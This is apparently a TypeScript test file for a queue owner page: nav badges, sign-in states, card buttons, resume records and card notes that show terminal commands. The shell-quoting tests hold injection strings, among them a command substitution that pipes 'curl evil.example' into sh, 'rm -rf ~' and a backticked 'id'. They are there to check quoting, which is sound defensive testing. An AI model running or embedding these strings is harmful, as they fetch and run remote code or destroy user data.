// Queue owner page: the nav slot, card precedence text, resume records and the card controls, read from the shipped
// queue.jsx through test/lib/render-screen.ts.
//
// Runner: npx tsx --test test/queue.owner-page.client.test.ts

import test, { describe } from "node:test";
import assert from "node:assert/strict";
import { fileURLToPath } from "node:url";
import { dirname, resolve } from "node:path";
import { collectText, findNodes, loadScreenModule, renderScreen, type RenderedNode } from "./lib/render-screen.js";

const __dirname = dirname(fileURLToPath(import.meta.url));
const QUEUE_SRC = resolve(__dirname, "../public/src/screens/queue.jsx");
const UI_SRC = resolve(__dirname, "../public/src/ui.jsx");
const realUiModule = (await loadScreenModule(UI_SRC)) as { UI: Record<string, unknown>; React: { createElement: (t: unknown, p: unknown) => unknown } };
const realUi = realUiModule.UI;
const realUiReact = realUiModule.React;

// window.UI stub — components resolve to transparent host elements; helpers and constants stay real.
function uiStub(): unknown {
  return new Proxy(
    {},
    {
      get: (_target, name: string) =>
        !/^[A-Z][a-z]/.test(name) && name in realUi
          ? realUi[name]
          : Object.defineProperty((props: Record<string, unknown>) => ({ __element: true, type: "ui-atom", props: { ...props, atom: name } }), "name", {
              value: name,
            }),
      has: () => true,
    },
  );
}

type Component = (props: unknown) => unknown;
interface ScreenModule {
  React: { createElement: (t: unknown, p: unknown, ...children: unknown[]) => unknown };
  [name: string]: unknown;
}

const screen = (await loadScreenModule(QUEUE_SRC, {
  URLSearchParams,
  window: { UI: uiStub(), location: { hash: "#queue" }, history: { replaceState: () => undefined } },
})) as ScreenModule;
// vm-realm values → this realm's prototypes, so deepEqual compares content
const getPlain = <T>(value: T): T => (value === undefined ? value : JSON.parse(JSON.stringify(value)));
const call = <T>(name: string, ...args: unknown[]): T => getPlain((screen[name] as (...a: unknown[]) => T)(...args));
const render = (name: string, props: unknown): RenderedNode => renderScreen(screen.React.createElement(screen[name] as Component, props)) as RenderedNode;

const SESSION_ID = "6f1c2a9e-4b7d-4e21-9a3f-0c5d8e7b1a42";
const CLI_PATH = "/Volumes/tools/atrium/scripts/atrium-queue.sh";
const READY_RESUMES = { status: "ready", data: [], error: null, busy: false };

function buildSession(overrides: Record<string, unknown> = {}) {
  return {
    id: SESSION_ID,
    profileLabel: "work-dev",
    cwd: "/Users/owner/Desktop/git/glass-atrium",
    cwdTail: "git/glass-atrium",
    configDir: null,
    state: "exited",
    launchHint: null,
    permissionHint: "default",
    marker: null,
    ...overrides,
  };
}

function buildItem(overrides: Record<string, unknown> = {}) {
  return {
    id: 41,
    kind: "decision",
    title: "Pick the migration order",
    body: "Two orders keep the shadow DB green.",
    linkedDocIds: [],
    options: [
      { code: "R1", label: "Schema first", pros: "one deploy", cons: "longer lock" },
      { code: "R2", label: "Data first", pros: "short lock", cons: "two deploys" },
    ],
    recommendedCode: "R2",
    isFreeTextAllowed: true,
    isApprovalClass: false,
    status: "open",
    queuePosition: 7,
    deferCount: 0,
    nextAttempt: 1,
    answer: { code: null, text: null },
    askedAt: "2026-11-10T06:12:43.518Z",
    answeredAt: null,
    deliveredAt: null,
    session: buildSession(),
    resumes: [],
    deviation: null,
    skipReason: null,
    canResend: false,
    ...overrides,
  };
}

function buildQueue(overrides: Record<string, unknown> = {}) {
  const calls: unknown[][] = [];
  const record = (name: string) => (...args: unknown[]) => calls.push([name, ...args]);
  return {
    calls,
    queue: {
      auth: "in",
      busy: { id: null, error: null },
      resumes: READY_RESUMES,
      readResumes: record("readResumes"),
      drafts: {},
      setDraft: record("setDraft"),
      later: record("later"),
      send: record("send"),
      answerItem: record("answerItem"),
      ...overrides,
    },
  };
}

const buttonLabelled = (tree: RenderedNode, label: string) => findNodes(tree, (node) => node.type === "button" && collectText(node).trim() === label);

describe("queue nav slot", () => {
  const ready = (awaiting: number, deviations: number) => ({ status: "ready", data: { awaiting, deviations, oldestAgeSeconds: 120 } });
  const rows = [
    { name: "a count never read gives no slot, so no zero that was not loaded", countState: { status: "loading" }, auth: "in", expected: undefined },
    { name: "an unread count shows a question mark rather than a blank badge", countState: { status: "error" }, auth: "in", expected: ["?"] },
    { name: "an unread count keeps the lock for a signed-out owner", countState: { status: "error" }, auth: "out", expected: ["?", "lock"] },
    { name: "zero awaiting still shows the numeral", countState: ready(0, 0), auth: "in", expected: ["0"] },
    { name: "a signed-out owner sees the same count plus a lock badge", countState: ready(3, 0), auth: "out", expected: ["3", "lock"] },
    { name: "an unprovisioned passphrase also shows the lock", countState: ready(2, 1), auth: "not_provisioned", expected: ["2", "lock"] },
    { name: "an unknown sign-in state claims no lock", countState: ready(2, 0), auth: "unknown", expected: ["2"] },
    { name: "a count answer without numbers reads as unread", countState: { status: "ready", data: { rows: [] } }, auth: "in", expected: ["?"] },
  ];
  for (const row of rows) {
    test(row.name, () => {
      const slot = call<{ queue?: { badges: Array<{ badge: string; icon?: string }> } }>("getQueueNavBadge", row.countState, row.auth);
      assert.deepEqual(slot.queue?.badges.map((badge) => badge.icon ?? badge.badge), row.expected);
    });
  }

  test("the deviation glyph rides the count only while a deviation is open", () => {
    const glyphOf = (deviations: number) =>
      call<{ queue: { badges: Array<{ glyph?: string; description: string }> } }>("getQueueNavBadge", ready(4, deviations), "in").queue.badges[0];
    assert.equal(glyphOf(0)?.glyph, undefined);
    assert.equal(glyphOf(2)?.glyph, (realUi.TONE_GLYPH as Record<string, string>).warn);
    assert.equal(glyphOf(2)?.description, "4 awaiting you, 2 deviations");
  });
});

describe("owner auth from an owner answer", () => {
  const rows = [
    { name: "401 signs the owner out", status: 401, data: { error: "unauthorized" }, expected: "out" },
    { name: "a 503 naming not_provisioned means the passphrase is not set", status: 503, data: { error: "not_provisioned" }, expected: "not_provisioned" },
    { name: "a 503 database outage leaves the sign-in state unchanged", status: 503, data: { error: "database_unavailable" }, expected: null },
    { name: "a 503 with no body leaves the sign-in state unchanged", status: 503, data: null, expected: null },
    { name: "a 2xx answer means signed in", status: 200, data: { ok: true }, expected: "in" },
    { name: "a conflict leaves the state unchanged", status: 409, data: { error: "conflict" }, expected: null },
  ];
  for (const row of rows) test(row.name, () => assert.equal(call("getAuthFromAnswerQ", { status: row.status, data: row.data }), row.expected));
});

describe("Later", () => {
  test("Later moves the item to the end and keeps the others in queue order", () => {
    const items = [buildItem({ id: 1 }), buildItem({ id: 2, kind: "report" }), buildItem({ id: 3 })];
    const ids = (list: Array<{ id: number }>) => list.map((item) => item.id);
    assert.deepEqual(ids(call("putLaterQ", items, 1)), [2, 3, 1]);
    assert.deepEqual(ids(call("putLaterQ", items, 2)), [1, 3, 2]);
  });

  const kinds = [
    { name: "a decision card offers Later", kind: "decision" },
    { name: "a report card offers Later", kind: "report" },
  ];
  for (const row of kinds) {
    test(row.name, () => {
      const { calls, queue } = buildQueue();
      const tree = render("QueueCardQ", { item: buildItem({ id: 9, kind: row.kind }), queue });
      const [later] = buttonLabelled(tree, "Later");
      assert.ok(later, "Later button rendered");
      (later.props.onClick as () => void)();
      assert.deepEqual(getPlain(calls), [["later", 9]]);
    });
  }
});

describe("after Send the focus moves to the next awaiting card", () => {
  const items = [buildItem({ id: 1 }), buildItem({ id: 2, status: "answered" }), buildItem({ id: 3 }), buildItem({ id: 4 })];
  const rows = [
    { name: "skips a card no longer awaiting", id: 1, expected: 3 },
    { name: "wraps to the first awaiting card from the last", id: 4, expected: 1 },
    { name: "no other awaiting card leaves the focus where it is", id: 1, list: [buildItem({ id: 1 }), buildItem({ id: 2, status: "answered" })], expected: null },
  ];
  for (const row of rows) test(row.name, () => assert.equal(call("getNextAwaitingIdQ", row.list ?? items, row.id), row.expected));
});

test("after Send the focus skips a card the active filter hides", async () => {
  const module = (await loadScreenModule(QUEUE_SRC, {
    window: { UI: uiStub() },
    fetch: async () => ({ status: 200, json: async () => ({ ok: true }) }),
  })) as ScreenModule;
  const personal = buildSession({ id: "9b2e7c41-0d3a-4c55-8e1f-2a6b9c4d7e10", profileLabel: "personal" });
  const items = [buildItem({ id: 1 }), buildItem({ id: 2, session: personal }), buildItem({ id: 3 })];
  const focus: unknown[] = [];
  const actions = (module.useQueueActionsQ as (deps: unknown) => { answerItem: (id: number, body: unknown) => Promise<void> })({
    list: { status: "ready", data: { items, nextCursor: null, isSocketDeliveryOn: true } },
    filter: { profile: "work-dev", session: "" },
    setList: () => undefined,
    setDrafts: () => undefined,
    setFocus: (next: unknown) => focus.push(next),
    putAuth: () => undefined,
    reload: () => undefined,
  });
  await actions.answerItem(1, { code: "R1" });
  assert.deepEqual(getPlain(focus), [{ id: 3 }]);
});

describe("signed out", () => {
  test("a 401 shows the passphrase form in place of the list", () => {
    const tree = render("QueueBodyQ", { queue: { ...buildQueue().queue, auth: "out", list: { status: "ready", data: null } } });
    assert.equal(findNodes(tree, (node) => node.type === "PassphraseFormQ").length, 1);
    assert.equal(findNodes(tree, (node) => node.type === "QueueListQ").length, 0);
  });

  test("card input held in page state reappears on the card after the sign-in", () => {
    const { queue } = buildQueue({ drafts: { 41: { text: "keep the shadow DB" } } });
    const tree = render("QueueCardQ", { item: buildItem(), queue });
    const [field] = findNodes(tree, (node) => node.type === "textarea");
    assert.equal(field?.props.value, "keep the shadow DB");
  });
});

describe("card state lines", () => {
  const rows = [
    { name: "unacked", deviation: "unacked", expected: "Unacked" },
    { name: "held", deviation: "held", expected: "Held" },
    { name: "expired", deviation: "expired", expected: "Expired" },
    { name: "resume pending", deviation: "resume_pending", expected: "Resume pending" },
    { name: "session not reachable shows the pull command", deviation: "session_not_reachable", expected: "Session not reachable", hasCommand: true },
    { name: "delivery off shows the pull command", deviation: "delivery_off", expected: "Delivery off — session alive", hasCommand: true },
  ];
  for (const row of rows) {
    test(`deviation label: ${row.name}`, () => {
      const text = collectText(render("CardStateQ", { item: buildItem({ status: "answered", deviation: row.deviation }), cliPath: CLI_PATH }));
      assert.ok(text.includes(row.expected), text);
      assert.equal(text.includes(`${CLI_PATH} pending`), row.hasCommand === true, text);
    });
  }

  test("a wrapper-launched session's card names the same-uid risk", () => {
    const text = collectText(render("CardStateQ", { item: buildItem({ session: buildSession({ launchHint: "accept_wrapper" }) }) }));
    assert.match(text, /any same-uid process can drive this bypass session/);
  });

  test("an approval-class decision says the terminal confirmation is still needed", () => {
    const text = (item: unknown) => collectText(render("DecisionBodyQ", { item, draft: {}, onDraft: () => undefined }));
    assert.match(text(buildItem({ isApprovalClass: true })), /terminal confirmation is still needed/);
    assert.doesNotMatch(text(buildItem()), /terminal confirmation/);
  });
});

describe("card precedence notes", () => {
  const occupant = { profileLabel: "personal", cwdTail: "wt/owner-queue", sessionIdPrefix: "9b2e7c41" };
  // a note's parts: a string is prose, { machine } renders through MachineString
  const markedLine = [
    "waiting on personal · wt/owner-queue · ",
    { machine: "9b2e7c41" },
    ", whose automatic resume has not registered: this one waits until that session registers " +
      "or is resumed in a terminal (see its card), and resumes automatically once that session has then ended",
  ];
  const generic = ["another session is live or resuming in this worktree: this one resumes automatically once that one has ended"];
  const capturedIdNote = [
    "the resumed session may still be running in the background: under profile work-dev, check it with ",
    { machine: "claude logs bg-7f3a" },
    ", and resume it yourself in a terminal only after ",
    { machine: "claude stop bg-7f3a" },
  ];
  const markedSession = (bgId: string | null, configDir: string | null = null) =>
    buildSession({ marker: { setAt: "2026-11-10T06:20:11.204Z", bgId }, configDir });
  const pending = (skipReason: unknown, extra: Record<string, unknown> = {}) => buildItem({ status: "resume_pending", skipReason, ...extra });
  const rows = [
    { name: "a used attempt asks for Resend", item: pending({ kind: "resume_used" }), expected: [["automatic resume used — Resend to try again"]] },
    { name: "an approval item needs the terminal", item: pending({ kind: "approval" }), expected: [["approval needs your terminal: resume the session yourself"]] },
    { name: "a resume in flight shows no text", item: pending({ kind: "in_flight" }), expected: [] },
    { name: "no marked occupant gives the generic worktree line", item: pending({ kind: "shared_worktree", markedOccupants: [], hasUnmarkedOccupant: true }), expected: [generic] },
    { name: "a marked occupant is named", item: pending({ kind: "shared_worktree", markedOccupants: [occupant], hasUnmarkedOccupant: false }), expected: [markedLine] },
    {
      name: "a marked and a live occupant give the marked line then the generic line",
      item: pending({ kind: "shared_worktree", markedOccupants: [occupant], hasUnmarkedOccupant: true }),
      expected: [markedLine, generic],
    },
    { name: "the captured-id marker form names the bg id and the profile", item: pending({ kind: "marker" }, { session: markedSession("bg-7f3a") }), expected: [capturedIdNote] },
    {
      name: "the listing marker form names the cwd and the full session id",
      item: pending({ kind: "marker" }, { session: markedSession(null) }),
      expected: [
        [
          "the resumed session may still be running in the background: under profile work-dev, check ",
          { machine: "claude agents --json --cwd /Users/owner/Desktop/git/glass-atrium" },
          " for the entry of session ",
          { machine: SESSION_ID },
          ", and resume it yourself in a terminal only once that entry is no longer listed, or after ",
          { machine: "claude stop <id>" },
          " with that entry's id",
        ],
      ],
    },
    {
      name: "the marker on an unacked card of a marked session replaces any skip text",
      item: buildItem({ status: "unacked", deviation: "unacked", session: markedSession("bg-7f3a") }),
      expected: [capturedIdNote],
    },
  ];
  for (const row of rows) test(row.name, () => assert.deepEqual(call("getCardNotesQ", row.item), row.expected));

  const configRows = [
    { name: "captured-id form carries the recorded config dir in each command", bgId: "bg-7f3a" },
    { name: "listing form carries the recorded config dir in each command", bgId: null },
  ];
  for (const row of configRows) {
    test(row.name, () => {
      const [note] = call<Array<Array<string | { machine: string }>>>("getCardNotesQ", buildItem({ session: markedSession(row.bgId, "/Users/owner/.claude-work-dev") }));
      const commands = (note ?? []).flatMap((part) => (typeof part === "string" || !part.machine.includes("claude ") ? [] : [part.machine]));
      assert.equal(commands.length, 2, String(commands));
      for (const command of commands) assert.ok(command.startsWith("CLAUDE_CONFIG_DIR=/Users/owner/.claude-work-dev claude "), command);
    });
  }

  // POSIX single-quote form: a value outside the plain-path set → one literal word, never expanded or split
  const quoteRows = [
    { name: "a plain path stays bare", value: "/Users/owner/Desktop/git/glass-atrium", quoted: "/Users/owner/Desktop/git/glass-atrium" },
    { name: "a space keeps the path one word", value: "/Users/owner/My Repos/app", quoted: "'/Users/owner/My Repos/app'" },
    { name: "command substitution stays literal", value: "/tmp/x$(curl evil.example|sh)", quoted: "'/tmp/x$(curl evil.example|sh)'" },
    { name: "a command separator stays literal", value: "/tmp/a; rm -rf ~", quoted: "'/tmp/a; rm -rf ~'" },
    { name: "a backtick stays literal", value: "/tmp/`id`", quoted: "'/tmp/`id`'" },
    { name: "an embedded single quote closes, escapes and reopens", value: "/tmp/it's", quoted: "'/tmp/it'\\''s'" },
  ];
  for (const row of quoteRows) {
    test(`every value a rendered command carries is shell-quoted: ${row.name}`, () => {
      const listing = call<Array<string | { machine: string }>[]>("getCardNotesQ", buildItem({ session: markedSession(null, row.value) }))[0] ?? [];
      const listed = buildItem({ session: { ...markedSession(null), cwd: row.value } });
      const [cwdCommand] = (call<Array<string | { machine: string }>[]>("getCardNotesQ", listed)[0] ?? []).flatMap((part) => (typeof part === "string" ? [] : [part.machine]));
      const captured = call<Array<string | { machine: string }>[]>("getCardNotesQ", buildItem({ session: markedSession(row.value) }))[0] ?? [];
      const pull = collectText(render("CardStateQ", { item: buildItem({ status: "answered", deviation: "delivery_off" }), cliPath: row.value }));
      assert.equal(cwdCommand, `claude agents --json --cwd ${row.quoted}`);
      assert.ok(listing.some((part) => typeof part !== "string" && part.machine.startsWith(`CLAUDE_CONFIG_DIR=${row.quoted} claude `)), JSON.stringify(listing));
      assert.ok(captured.some((part) => typeof part !== "string" && part.machine === `claude logs ${row.quoted}`), JSON.stringify(captured));
      assert.ok(pull.includes(`${row.quoted} pending`), pull);
    });
  }

  test("a note's commands and ids render through MachineString and its prose carries no backticks", () => {
    const tree = render("CardStateQ", { item: pending({ kind: "marker" }, { session: markedSession("bg-7f3a") }) });
    const machine = findNodes(tree, (node) => node.props.atom === "MachineString").map((node) => collectText(node));
    assert.deepEqual(machine, ["claude logs bg-7f3a", "claude stop bg-7f3a"]);
    assert.doesNotMatch(collectText(tree), /`/);
  });

  test("a marked session with a used attempt shows the marker reason and no Resend", () => {
    const item = pending({ kind: "marker" }, { session: markedSession("bg-7f3a"), canResend: false, resumes: [{ attempt: 1, sentAt: "2026-11-10T06:20:11.204Z", result: "sent", abortReason: null, bgId: "bg-7f3a" }] });
    const tree = render("QueueCardQ", { item, queue: buildQueue().queue });
    assert.match(collectText(tree), /claude logs bg-7f3a/);
    assert.equal(buttonLabelled(tree, "Resend").length, 0);
  });

  test("a used attempt in a shared worktree shows the used state with Resend", () => {
    const item = pending({ kind: "resume_used" }, { canResend: true });
    const { calls, queue } = buildQueue();
    const tree = render("QueueCardQ", { item, queue });
    assert.match(collectText(tree), /automatic resume used — Resend to try again/);
    const [resend] = buttonLabelled(tree, "Resend");
    (resend?.props.onClick as () => void)();
    assert.deepEqual(getPlain(calls), [["send", 41, "resend"]]);
  });
});

describe("automatic resume record", () => {
  const rows = [
    { name: "a spawn", resume: { result: "sent", abortReason: null }, expected: "spawned" },
    { name: "a failed spawn", resume: { result: "failed", abortReason: null }, expected: "failed" },
    { name: "an abort because the session came back", resume: { result: "aborted", abortReason: "session_returned" }, expected: "not spawned: session came back" },
    { name: "an abort for a shared worktree", resume: { result: "aborted", abortReason: "shared_worktree" }, expected: "not spawned: another session in this worktree" },
  ];
  for (const row of rows) test(`result label: ${row.name}`, () => assert.equal(call("getResumeResultLabelQ", row.resume), row.expected));

  test("each card resume shows its time, account and result", () => {
    const resume = { attempt: 2, sentAt: "2026-11-10T06:20:11.204Z", result: "aborted", abortReason: "session_returned", bgId: null };
    const text = collectText(render("QueueCardQ", { item: buildItem({ status: "resume_pending", resumes: [resume] }), queue: buildQueue().queue }));
    const line = text.split("Automatic resume ")[1] ?? "";
    assert.ok(line.startsWith((realUi.formatKstDateTime as (iso: string) => string)(resume.sentAt)), line);
    assert.match(line, /work-dev · attempt 2 · not spawned: session came back/);
  });

});

describe("recent automatic resumes", () => {
  const row = (itemId: number, title: string, attempt: number, result: string) => ({
    attempt,
    sentAt: "2026-11-10T06:40:00.870Z",
    result,
    abortReason: null,
    bgId: null,
    item: { id: itemId, title },
    session: { profileLabel: ".claude-work", cwdTail: "atrium/hooks" },
  });

  test("the record lists the server's resume rows in its order, each with account, worktree and item title", () => {
    const resumes = [row(9, "Pick the lock order", 2, "acked"), row(4, "Pick the index", 1, "sent")];
    const text = collectText(render("RecentResumesQ", { region: { ...READY_RESUMES, data: resumes }, onRetry: () => undefined }));
    const lines = text.split("Automatic resume ").slice(1);
    assert.equal(lines.length, 2, text);
    assert.match(lines[0] ?? "", /\.claude-work · atrium\/hooks · attempt 2 · spawned · acknowledged\s+— Pick the lock order/);
    assert.match(lines[1] ?? "", /attempt 1 · spawned\s+— Pick the index/);
  });

  const views = [
    { name: "a failed read shows the shared region failure with Retry", region: { status: "error", data: null, error: "HTTP 503 database_unavailable", busy: false }, atom: "RegionUnavailable", isShown: true },
    { name: "an empty record shows nothing", region: READY_RESUMES, atom: "Card", isShown: false },
    { name: "a first read in flight shows nothing", region: { status: "loading", data: null, error: null, busy: true }, atom: "Card", isShown: false },
  ];
  for (const view of views) {
    test(view.name, () => {
      const tree = render("RecentResumesQ", { region: view.region, onRetry: () => undefined });
      assert.equal(findNodes(tree, (node) => node.props?.atom === view.atom).length > 0, view.isShown);
    });
  }

  test("the record is read from the resume route, whatever the owner list holds", async () => {
    const urls: string[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: realUi },
      fetch: async (url: string) => {
        urls.push(url);
        return { status: 200, json: async () => ({ resumes: [row(9, "Pick the lock order", 1, "acked")] }) };
      },
    })) as ScreenModule;
    let region: unknown = realUi.INITIAL_REGION_STATE;
    const setResumes = (next: (prev: unknown) => unknown) => { region = next(region); };
    await (module.getResumesQ as (deps: unknown) => Promise<void>)({ setResumes, putAuth: () => undefined });
    assert.deepEqual(urls, ["/api/queue/owner/resumes"]);
    assert.deepEqual((getPlain(region) as { data: Array<{ item: { id: number } }> }).data.map((resume) => resume.item.id), [9]);
  });
});

describe("screen", () => {
  test("the Queue screen renders its header and a loading body before the first read", () => {
    const tree = render("ScreenQueue", {});
    const atoms = findNodes(tree, (node) => node.type === "ui-atom").map((node) => node.props.atom);
    assert.ok(atoms.includes("PageHeader"), String(atoms));
    assert.ok(atoms.includes("LoadingPlaceholder"), String(atoms));
  });

  test("a loaded list renders one card per item and the degraded banner while socket delivery is off", () => {
    const { queue } = buildQueue();
    const data = { items: [buildItem({ id: 1 }), buildItem({ id: 2, kind: "report", linkedDocIds: [43944] })], nextCursor: null, isSocketDeliveryOn: false };
    const tree = render("QueueListQ", { queue: { ...queue, list: { status: "ready", data }, filter: { profile: "", session: "" }, setFilter: () => undefined } });
    assert.equal(findNodes(tree, (node) => node.type === "QueueCardQ").length, 2);
    assert.equal(findNodes(tree, (node) => node.type === "DegradedBannerQ").length, 1);
    const [link] = findNodes(tree, (node) => node.props.atom === "Link");
    assert.equal(link?.props.href, "#clauded-docs?doc=43944");
  });
});

describe("an owner action's answer", () => {
  const draft = { 41: { code: "R2", text: "keep the shadow DB" } };
  const run = async (status: number, body: unknown) => {
    const posts: Array<{ url: string; body: unknown }> = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async (url: string, init: { body: string }) => {
        posts.push({ url, body: JSON.parse(init.body) });
        return { status, json: async () => body };
      },
    })) as ScreenModule;
    let drafts: Record<string, unknown> = { ...draft };
    let busy: unknown = null;
    const auth: unknown[] = [];
    const counts = { reload: 0 };
    const isDone = await (module.sendActionQ as (deps: unknown) => Promise<boolean>)({
      id: 41,
      action: "answer",
      body: { code: "R2", text: "keep the shadow DB" },
      setBusy: (next: unknown) => { busy = next; },
      setDrafts: (next: (prev: Record<string, unknown>) => Record<string, unknown>) => { drafts = next(drafts); },
      putAuth: (answer: { status: number }) => auth.push(answer.status),
      reload: () => { counts.reload += 1; },
    });
    return { isDone, drafts: getPlain(drafts), busy: getPlain(busy), auth, posts: getPlain(posts), reloads: counts.reload };
  };

  test("a taken answer posts the card's body, clears its draft and re-reads the list", async () => {
    const result = await run(200, { ok: true });
    assert.deepEqual(result.posts, [{ url: "/api/queue/owner/items/41/answer", body: { code: "R2", text: "keep the shadow DB" } }]);
    assert.equal(result.isDone, true);
    assert.equal(result.drafts[41], undefined);
    assert.equal(result.reloads, 1);
  });

  const refusals = [
    { name: "a 401 keeps the draft for the re-login, signs the owner out and shows no card error", status: 401, body: { error: "unauthorized" }, error: null },
    {
      name: "a refusal keeps the draft and shows the reason on the card",
      status: 400,
      body: { error: "unknown_option", reason: "the code is not one of this item's options" },
      error: { id: 41, message: "Refused: the code is not one of this item's options." },
    },
  ];
  for (const row of refusals) {
    test(row.name, async () => {
      const result = await run(row.status, row.body);
      assert.equal(result.isDone, false);
      assert.deepEqual(result.drafts, draft);
      assert.deepEqual(result.auth, [row.status]);
      assert.deepEqual(result.busy, { id: null, error: row.error });
      assert.equal(result.reloads, 0);
    });
  }
});

describe("sign out", () => {
  const run = async (status: number, body: unknown) => {
    const posts: Array<{ url: string; body: unknown }> = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async (url: string, init: { body: string }) => {
        posts.push({ url, body: JSON.parse(init.body) });
        return { status, json: async () => body };
      },
    })) as ScreenModule;
    const auth: number[] = [];
    const error = await (module.deleteSessionQ as (putAuth: unknown) => Promise<string | null>)((answer: { status: number }) => auth.push(answer.status));
    return { error, auth, posts: getPlain(posts) };
  };

  const rows = [
    { name: "an ended session signs the owner out", status: 200, body: { ok: true }, auth: [401], error: null },
    { name: "a session already gone also reads signed out", status: 401, body: { error: "unauthorized" }, auth: [401], error: null },
    { name: "a database outage keeps the owner signed in and names the outage", status: 503, body: { error: "database_unavailable" }, auth: [503], error: "outage" },
    { name: "a refusal keeps the owner signed in and says so", status: 403, body: { error: "forbidden" }, auth: [403], error: "The monitor refused the sign-out. Reload the page, then try again." },
  ];
  for (const row of rows) {
    test(row.name, async () => {
      const result = await run(row.status, row.body);
      assert.deepEqual(result.posts, [{ url: "/api/queue/owner/logout", body: {} }]);
      assert.deepEqual(result.auth, row.auth);
      if (row.error === "outage") assert.equal(result.error, call("getOutageStepQ", { status: row.status, data: row.body }));
      else assert.equal(result.error, row.error);
    });
  }

  const headerActions = (auth: string, signOut: () => unknown = () => null) => {
    const [header] = findNodes(render("QueueHeaderQ", { queue: { auth, reload: () => undefined, signOut, list: { status: "ready", data: null, readAt: null }, resumes: READY_RESUMES } }), (node) => node.props?.atom === "PageHeader");
    const actions = header?.props.actions;
    return actions ? (renderScreen(actions) as RenderedNode) : null;
  };

  test("a signed-in header offers Sign out, and its click ends the session", async () => {
    let calls = 0;
    const tree = headerActions("in", () => { calls += 1; return Promise.resolve(null); });
    const [button] = tree ? buttonLabelled(tree, "Sign out") : [];
    await (button?.props.onClick as () => Promise<void>)();
    assert.equal(calls, 1);
  });

  const signedOutRows = [
    { name: "signed out", auth: "out" },
    { name: "not provisioned", auth: "not_provisioned" },
    { name: "not yet read", auth: "unknown" },
  ];
  for (const row of signedOutRows) {
    test(`no Sign out while ${row.name}`, () => {
      const tree = headerActions(row.auth);
      assert.equal(tree === null ? 0 : buttonLabelled(tree, "Sign out").length, 0);
    });
  }
});

describe("card buttons", () => {
  const sendRows = [
    { name: "no option and no text leaves Send disabled", draft: {}, body: null },
    { name: "whitespace-only text leaves Send disabled", draft: { text: "   " }, body: null },
    { name: "a picked option alone sends its code", draft: { code: "R1" }, body: { code: "R1" } },
    { name: "text alone sends the text", draft: { text: "hold until Friday" }, body: { text: "hold until Friday" } },
    { name: "an option and text send both", draft: { code: "R2", text: "after the deploy" }, body: { code: "R2", text: "after the deploy" } },
  ];
  for (const row of sendRows) {
    test(row.name, () => {
      const { calls, queue } = buildQueue();
      const [send] = buttonLabelled(render("CardActionsQ", { item: buildItem(), draft: row.draft, queue, isBusy: false }), "Send");
      assert.equal(send?.props.disabled, row.body === null);
      if (row.body !== null) (send?.props.onClick as () => void)();
      assert.deepEqual(getPlain(calls), row.body === null ? [] : [["answerItem", 41, row.body]]);
    });
  }

  test("Seen on a report sends the seen action", () => {
    const { calls, queue } = buildQueue();
    const [seen] = buttonLabelled(render("CardActionsQ", { item: buildItem({ kind: "report" }), draft: {}, queue, isBusy: false }), "Seen");
    (seen?.props.onClick as () => void)();
    assert.deepEqual(getPlain(calls), [["send", 41, "seen"]]);
  });

  const replyRows = [
    { name: "a typed reply offers Send reply with the typed text", draft: { text: "thanks, merged" }, calls: [["send", 41, "reply", { text: "thanks, merged" }]] },
    { name: "a blank reply offers no Send reply", draft: { text: "  " }, calls: null },
  ];
  for (const row of replyRows) {
    test(row.name, () => {
      const { calls, queue } = buildQueue();
      const [reply] = buttonLabelled(render("CardActionsQ", { item: buildItem({ kind: "report" }), draft: row.draft, queue, isBusy: false }), "Send reply");
      assert.equal(reply === undefined, row.calls === null);
      (reply?.props.onClick as (() => void) | undefined)?.();
      assert.deepEqual(getPlain(calls), row.calls ?? []);
    });
  }
});

// spacing reads the role-key ladder (index.html tailwind config) → a number or a px value in a queue node is drift
const NUMERIC_SPACING_CLASS = /(^|\s)-?(p|m|gap|space)(x|y|t|r|b|l|s|e)?-(\d|\[)/;

describe("the queue page spaces on role keys only", () => {
  const data = {
    items: [
      buildItem({ id: 1, isApprovalClass: true, deviation: "delivery_off", resumes: [{ attempt: 1, sentAt: "2026-11-10T06:20:11.204Z", result: "sent", abortReason: null, bgId: null }] }),
      buildItem({ id: 2, kind: "report", linkedDocIds: [43944], session: buildSession({ launchHint: "accept_wrapper", marker: { setAt: "2026-11-10T06:20:11.204Z", bgId: null } }) }),
    ],
    nextCursor: 9,
    isSocketDeliveryOn: false,
  };
  const states = [
    { name: "a loaded list with cards, the banner and Show more", node: () => render("QueueListQ", { queue: { ...buildQueue().queue, list: { status: "ready", data }, filter: { profile: "", session: "" }, setFilter: () => undefined } }) },
    { name: "a card with a refusal", node: () => render("QueueCardQ", { item: data.items[0], queue: buildQueue({ busy: { id: null, error: { id: 1, message: "Refused: x." } } }).queue }) },
    { name: "the sign-in form", node: () => render("PassphraseFormQ", { onLogin: async () => null }) },
    { name: "the setup card", node: () => render("LoginFormQ", { auth: "not_provisioned", onLogin: async () => null }) },
  ];
  for (const row of states) {
    test(row.name, () => {
      const classes = findNodes(row.node(), () => true).map((node) => String(node.props?.className ?? ""));
      assert.deepEqual(classes.filter((value) => NUMERIC_SPACING_CLASS.test(value)), []);
    });
  }
});

describe("report reply", () => {
  const rows = [
    { name: "a report that takes a reply shows the reply field", isFreeTextAllowed: true, fields: 1 },
    { name: "a report that takes no reply shows no reply field", isFreeTextAllowed: false, fields: 0 },
  ];
  for (const row of rows) {
    test(row.name, () => {
      const tree = render("ReportBodyQ", { item: buildItem({ kind: "report", isFreeTextAllowed: row.isFreeTextAllowed }), draft: {}, onDraft: () => undefined });
      assert.equal(findNodes(tree, (node) => node.type === "textarea").length, row.fields);
    });
  }
});

describe("action refusal copy", () => {
  const rows = [
    { name: "the server's worded reason is shown", answer: { status: 400, data: { error: "free_text_not_allowed", reason: "this report takes no reply" } }, expected: "Refused: this report takes no reply." },
    { name: "a refusal with no reason shows fixed copy", answer: { status: 400, data: { error: "invalid_input", issues: [] } }, expected: "The monitor refused this action. Refresh and try again." },
    { name: "a refusal with no body shows fixed copy", answer: { status: 400, data: null }, expected: "The monitor refused this action. Refresh and try again." },
    { name: "a state change names the refresh", answer: { status: 409, data: { error: "conflict", reason: "item is answered" } }, expected: "Refused: the item changed state. Refresh to see where it is now." },
  ];
  for (const row of rows) test(row.name, () => assert.equal(call("getActionErrorQ", row.answer), row.expected));
});

describe("queue filter bar", () => {
  const items = [
    buildItem({ id: 1, session: buildSession({ profileLabel: "work-dev" }) }),
